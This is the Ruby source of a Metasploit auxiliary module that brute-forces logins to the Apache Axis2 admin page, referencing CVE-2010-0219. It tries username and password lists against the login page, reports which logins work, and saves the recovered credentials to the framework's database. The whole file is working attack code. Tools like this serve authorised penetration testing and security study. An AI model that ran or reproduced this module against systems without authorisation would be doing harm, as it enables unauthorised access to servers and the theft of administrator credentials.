##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'metasploit/framework/login_scanner/axis2'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Apache Axis2 Brute Force Utility',
      'Description'    => %q{
        This module attempts to login to an Apache Axis2 instance using
        username and password combindations indicated by the USER_FILE,
        PASS_FILE, and USERPASS_FILE options. It has been verified to
        work on at least versions 1.4.1 and 1.6.2.
      },
      'Author'         =>
        [
          '==[ Alligator Security Team ]==',
          'Leandro Oliveira <leandrofernando[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'CVE', '2010-0219' ],
          [ 'OSVDB', '68662'],
        ],
      'License'        => MSF_LICENSE
    )

    register_options( [
      Opt::RPORT(8080),
      OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
    ], self.class)
  end

  def target_url
    "http://#{vhost}:#{rport}#{datastore['URI']}"
  end

  def run_host(ip)

    print_status("Verifying login exists at #{target_url}")
    begin
      send_request_cgi({
        'method'  => 'GET',
        'uri'     => datastore['URI']
      }, 20)
    rescue
      print_error("The Axis2 login page does not exist at #{target_url}")
      return
    end

    print_status "#{target_url} - Apache Axis - Attempting authentication"

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    scanner = Metasploit::Framework::LoginScanner::Axis2.new(
      host: ip,
      port: rport,
      uri: datastore['URI'],
      proxies: datastore["PROXIES"],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 5,
    )

    scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        do_report(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: result.credential.realm_key,
            realm_value: result.credential.realm,
            status: result.status
        )
      end
    end

  end

  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

end
